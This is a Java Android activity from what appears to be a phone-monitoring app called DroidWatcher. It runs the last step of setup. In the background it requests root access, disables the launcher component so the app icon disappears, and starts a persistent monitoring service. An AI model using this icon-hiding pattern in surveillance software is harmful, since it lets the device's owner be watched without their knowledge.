package com.droidwatcher.activity;

import com.droidwatcher.DBManager;
import com.droidwatcher.R;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.services.AppService;
import com.stericson.RootTools.RootTools;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.text.Html;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class StartupFinalActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		setContentView(R.layout.activity_startup_final);
		
		CharSequence styledText = Html.fromHtml(getString(R.string.connectionSuccess));
		TextView tv = (TextView) findViewById(R.id.wizard_text);
		tv.setText(styledText);
		
		findViewById(R.id.wizard_btn_finish).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				startActivity(new Intent(StartupFinalActivity.this, MainMenuActivity.class));
				StartupFinalActivity.this.finish();
			}
		});
		
		new FinalPrepareTask().execute();
	}
	
	private class FinalPrepareTask extends AsyncTask<Void, Void, Void>{

		@Override
		protected Void doInBackground(Void... params) {
			if (RootTools.isRootAvailable()) {
				RootTools.isAccessGiven();
	        }
			
			PackageManager p = getPackageManager();
	        ComponentName componentName = new ComponentName(StartupFinalActivity.this, LauncherActivity.class);
	        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	        
	        DBManager m = new DBManager(StartupFinalActivity.this);
	        m.getReadableDatabase().close();
	        m.close();
	        
	        SettingsManager settings = new SettingsManager(StartupFinalActivity.this);
	        settings.connected(true);
	        
	        startService(new Intent(StartupFinalActivity.this, AppService.class));
	        
			return null;
		}
		
		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
			
			Button btn = (Button) findViewById(R.id.wizard_btn_finish);
			btn.setText(R.string.finish);
			btn.setEnabled(true);
		}
		
	}
}
